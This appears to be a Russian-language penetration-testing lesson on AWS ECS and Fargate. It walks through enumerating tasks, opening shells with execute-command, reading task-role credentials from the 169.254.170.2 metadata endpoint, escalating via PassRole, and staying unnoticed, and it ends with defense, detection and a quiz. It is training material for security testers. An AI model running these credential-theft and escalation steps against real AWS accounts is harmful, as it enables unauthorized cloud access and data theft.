---
id: cloud-aws-ecs
title: "ECS и Fargate: task role, определения задач и exec"
category: cloud
parent: cloud-aws-deep
difficulty: hard
order: 4
tags: [cloud, aws, ecs, fargate, task-role, container, exec]
prerequisites: [cloud-aws-deep, cloud-containers-docker]
useful_for:
  - "Пентест контейнерных рабочих нагрузок AWS"
  - "Захват task role из контейнера"
  - "RCE внутри ECS/Fargate"
estimated_minutes: 50
summary: "Как устроены ECS и Fargate, чем task role отличается от execution role, как через execute-command и определения задач захватить права контейнера и выйти в аккаунт."
---

## Зачем этот урок

ECS (Elastic Container Service) и Fargate — это AWS-способ запускать контейнеры без управления узлами. В отличие от Kubernetes, здесь нет kubelet и API-сервера, но есть свои привилегированные сущности: **task role**, **execution role**, **task definitions** и **cluster**. Атакующему важно понимать: контейнер в ECS — это не только приложение, но и **идентичность** (task role) с доступом к AWS API. Если вы можете выполнить код в задаче (через уязвимость приложения, `execute-command` или подменённый образ), вы получаете креды task role — а это, как правило, доступ к S3, DynamoDB, SQS и иногда к более широким сервисам. Этот урок — про устройство ECS/Fargate, поиск опасных конфигураций и захват роли контейнера.

## Как устроены ECS и Fargate

Ключевые понятия:

- **Cluster** — логическая группа сервисов и задач. В Fargate это абстракция (нет ваших инстансов).
- **Task definition** — шаблон: образы, CPU/память, порты, переменные окружения, секреты, две роли, logging, volumes.
- **Task** — запущенный экземпляр task definition.
- **Service** — поддерживает желаемое число задач, балансировщик, rolling update.
- **Execution role** — от её имени агент ECS тянет образ из ECR, пишет логи, читает secrets из SSM/Secrets Manager. **Важно:** execution role не даёт прав самому приложению.
- **Task role** — роль, чьи креды доступны **внутри** контейнера (через metadata endpoint `169.254.170.2`). Именно её захватывает атакующий.

В Fargate контейнер получает креды task role по специальному адресу:

```
http://169.254.170.2/v2/credentials/<relative-uri>
```

`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — переменная окружения, задающая этот путь. В отличие от EC2 IMDS, здесь нет hop-limit и IMDSv2-танцев: если есть SSRF в приложении, креды утекают напрямую.

Опасные конфигурации, которые ищет пентестер:

- `privileged: true` (в EC2 launch type) — выход на хост.
- `networkMode: host` — контейнер в сети хоста.
- Переменные окружения с секретами в открытом виде в task definition.
- `secrets` из SSM/Secrets Manager, доступные execution role.
- Volume с хостовым путём (`host` sourcePath) — потенциальный доступ к файлам узла.
- `execute-command` включён, а роль имеет `ecs:ExecuteCommand`.

## Инструменты и команды

Разведка:

```bash
# Кластеры и сервисы
aws ecs list-clusters
aws ecs list-services --cluster prod-cluster
aws ecs list-tasks --cluster prod-cluster --service-name api

# Описание задачи: роли, образ, env, secrets
aws ecs describe-tasks --cluster prod-cluster --tasks <task-arn> \
  --query 'tasks[0].{taskRole:taskRoleArn,execRole:executionRoleArn,overrides:overrides}'

# Определение задачи (шаблон) — здесь видны все секреты env и volume
aws ecs describe-task-definition --task-definition api:12 \
  --query 'taskDefinition.{roles:taskRoleArn,exec:executionRoleArn,containers:containerDefinitions[].{name:name,env:environment,secrets:secrets,priv:privileged,mounts:mountPoints}}'
```

Проверка `execute-command`:

```bash
aws ecs describe-services --cluster prod-cluster --services api \
  --query 'services[0].enableExecuteCommand'
```

RCE через ExecuteCommand:

```bash
aws ecs execute-command --cluster prod-cluster --task <task-arn> \
  --container api --interactive --command "/bin/sh"
# Даёт shell внутри контейнера (если включено и есть права)
```

Захват task role изнутри:

```bash
# Внутри контейнера
env | grep AWS_CONTAINER
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
# => {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

## Разобранный пример: от описания задачи к кодам

Сценарий: у вашей роли есть `ecs:Describe*`, `ecs:List*`, `ecs:ExecuteCommand` и `iam:PassRole` (нет). Ищем задачу с широкой task role.

Шаг 1 — перечисляем задачи:

```bash
aws ecs list-tasks --cluster prod-cluster --query 'taskArns' --output text
arn:aws:ecs:us-east-1:123456789012:task/prod-cluster/abc123
```

Шаг 2 — смотрим task role и определение:

```bash
aws ecs describe-tasks --cluster prod-cluster --tasks abc123 \
  --query 'tasks[0].taskRoleArn' --output text
arn:aws:iam::123456789012:role/api-task-role
```

Шаг 3 — исполняем команду в контейнере (если `enableExecuteCommand` = true):

```bash
aws ecs execute-command --cluster prod-cluster --task abc123 \
  --container api --interactive --command "/bin/sh"
# (shell) id
# uid=0(root) gid=0(root) groups=0(root)
# (shell) env | grep AWS
# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/xxxx
# (shell) curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

Шаг 4 — извлекаем креды и проверяем:

```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# Arn: ...:assumed-role/api-task-role/abc123
```

Шаг 5 — разведка прав task role. Часто задача имеет доступ к SQS/DynamoDB/S3 и секретам. Запускаем `enumerate-iam` и читаем переменные окружения: там могут быть токены третьих сторон.

Шаг 6 — если `execute-command` недоступен, но есть уязвимость в приложении (SSRF/RCE), тот же metadata endpoint даёт креды напрямую. Это стандартная цепочка «SSRF → task role».

## Варианты атак и обходы

- **Secrets в task definition.** Если execution role читает `secrets` из SSM, а вы можете `DescribeTaskDefinition`, вы увидите ARN секретов; при наличии `ssm:GetParameter` — получите значения.
- **Подмена образа.** Если у вас есть push в ECR-репозиторий, который использует сервис, вы можете заменить образ на свой и получить task role при следующем деплое (`cloud-artifact-registry`).
- **`iam:PassRole` + `ecs:RegisterTaskDefinition`/`RunTask`.** Классическая эскалация: регистрируем новое определение задачи с **чужой** ролью (`PassRole`), запускаем задачу и читаем её креды. Это прямой путь к роли с более широкими правами.
- **Host network / privileged (EC2 launch type).** Даёт доступ к хосту и его instance profile — тогда вы получаете и роль инстанса, и все соседние контейнеры.
- **Environment variable injection.** Если сервис обновляется из CI и вы можете влиять на переменные, добавьте `AWS_*`-переменные, чтобы перехватить SDK.
- **Log/task metadata.** `ecs:DescribeTasks` возвращает `overrides` и иногда `containers[].managedAgents` с чувствительными деталями.

## Частые ошибки и подводные камни

- **Путать execution role и task role.** Кража execution role даёт доступ к ECR/логам, но не к прикладным данным; цель — task role.
- **Fargate без `execute-command`.** В Fargate нет доступа к узлу; RCE возможен только через приложение или подменённый образ.
- **Забывать про `169.254.170.2`.** Это ECS-специфичный metadata endpoint, отличный от `169.254.169.254`.
- **Считать `describe-task-definition` безопасным.** Он нередко раскрывает env-переменные и пути секретов.
- **Игнорировать `enableExecuteCommand`.** Без него `execute-command` вернёт ошибку, но `ExecuteCommand` может быть включён на уровне задачи через override.
- **Не проверять `sts:AssumeRole` из task role.** Часто именно она ведёт к следующей роли.

## Защита и детект

- **Минимальные права task role.** Task role — под конкретное приложение; никаких `*` и `iam:*`.
- **Секреты только через `secrets`, не через `environment`.** Открытые env-переменные видны в `DescribeTaskDefinition` и в контейнере.
- **Ограничивайте `iam:PassRole`.** Условие `iam:PassedToService: ecs-tasks.amazonaws.com` и allowlist ARN ролей.
- **Детект.** CloudTrail события `ExecuteCommand`, `RegisterTaskDefinition`, `RunTask`, `DescribeTaskDefinition` (data events для ECS). GuardDuty finding `Runtime:Container/...`, `CredentialAccess:IAMUser/...`. Алерты на `PassRole` в ECS, на новые task definitions с незнакомыми ролями.
- **Сетевой изоляция.** Задачи в приватных подсетях; egress ограничен (нет прямого доступа к metadata сторонних сервисов).

## OPSEC

`ExecuteCommand` и `RegisterTaskDefinition` — заметные события. Регистрация своего task definition остаётся в аккаунте и легко обнаруживается аудитом. Для тихой работы предпочитайте использование уже существующей задачи (SSRF в приложении) вместо создания новых сущностей. Учтите, что Fargate-задачи пересоздаются — ваш shell исчезнет после деплоя.

## ECS и Kubernetes: что важно атакующему

С точки зрения атаки ECS и Kubernetes похожи: и там, и там контейнер имеет идентичность, а оркестратор — привилегированный API. Но различия существенны:

| Аспект | ECS/Fargate | Kubernetes |
|--------|-------------|------------|
| Идентичность пода | Task role через `169.254.170.2` | ServiceAccount token + IRSA/Workload Identity |
| Управляющий API | `ecs:*` (нет прямого API-сервера) | kube-apiserver, kubelet |
| RCE извне | `execute-command`, уязвимость приложения | kubelet, exec, уязвимость приложения |
| Побег на хост | EC2 launch type + privileged/host network | hostPath, privileged, capabilities |
| Пользовательские сущности | Task definition, service | Pod, Deployment, CRD |

Практический вывод: в ECS меньше «движущихся частей» для побега (Fargate вообще не даёт хоста), зато `iam:PassRole` + `RegisterTaskDefinition` — очень чистая эскалация. В Kubernetes больше поверхностей (kubelet, RBAC, CRD), но и больше защит по умолчанию в managed-кластерах. Если у вас есть доступ к обоим — начинайте с ECS: там путь к роли обычно короче.

## Мониторинг и логирование задач

При пентесте полезно понимать, что о вас останется в логах. ECS пишет в CloudWatch Logs (по конфигурации `logConfiguration`), а события API — в CloudTrail. `ExecuteCommand` создаёт сессию SSM, которая может логироваться в S3/CloudWatch, если включён Session Manager logging. Task definitions с новыми ролями фиксируются как `RegisterTaskDefinition`. Если приложение пишет свои логи, туда попадут ваши команды, если вы делали что-то через приложение. Для OPSEC предпочитайте не создавать новых сущностей и помните, что удаление task definition (deregister) не стирает историю.

## Что дальше / решение

Ключ к ECS — **task role**, и получить её можно двумя путями: `execute-command` (если включён и есть право) или уязвимость в приложении, дающая доступ к `169.254.170.2`. Если у вас есть `iam:PassRole` + `ecs:RegisterTaskDefinition`, эскалация к произвольной роли — почти формальность: зарегистрируйте определение с целевой ролью и запустите задачу. Дальше — разведка прав и цепочки (`cloud-privesc-iam`). Для персистентности можно подменить образ или добавить задачу в сервис, но помните про заметность. Записывайте находки: какие задачи имели широкие роли, какие env-переменные утекали, какие пути вели к секретам.

## Квиз

```quiz
- question: "Какая роль даёт права самому приложению внутри ECS-контейнера?"
  options:
    - "Task role"
    - "Execution role"
    - "Service-linked role"
    - "Instance profile"
  answer: 0
  explanation: "Task role доступна внутри контейнера; execution role нужна агенту ECS для ECR/логов/secrets."
- question: "По какому адресу Fargate-контейнер получает креды task role?"
  options:
    - "http://169.254.170.2"
    - "http://169.254.169.254"
    - "http://metadata.google.internal"
    - "http://127.0.0.1:8080"
  answer: 0
  explanation: "ECS/Fargate используют отдельный endpoint 169.254.170.2 с relative URI."
- question: "Какая комбинация прав позволяет эскалировать к произвольной роли через ECS?"
  options:
    - "iam:PassRole + ecs:RegisterTaskDefinition/RunTask"
    - "s3:GetObject + s3:ListBucket"
    - "ec2:DescribeInstances"
    - "route53:ListHostedZones"
  answer: 0
  explanation: "PassRole позволяет зарегистрировать задачу с чужой ролью и запустить её."
- question: "Что безопаснее для секретов в ECS?"
  options:
    - "Использовать secrets из SSM/Secrets Manager, а не environment"
    - "Писать пароли в environment"
    - "Хранить их в описании задачи"
    - "Публиковать в логах"
  answer: 0
  explanation: "Environment видны в DescribeTaskDefinition и в контейнере; secrets подтягиваются в рантайме."
```

## Где пригодится

- **Пентест AWS:** контейнерные рабочие нагрузки и захват ролей.
- **Red team:** RCE в ECS/Fargate и эскалация через PassRole.
- **Blue team:** аудит task definitions и прав ExecuteCommand/PassRole.
- **CTF:** облачные задачи про контейнеры.
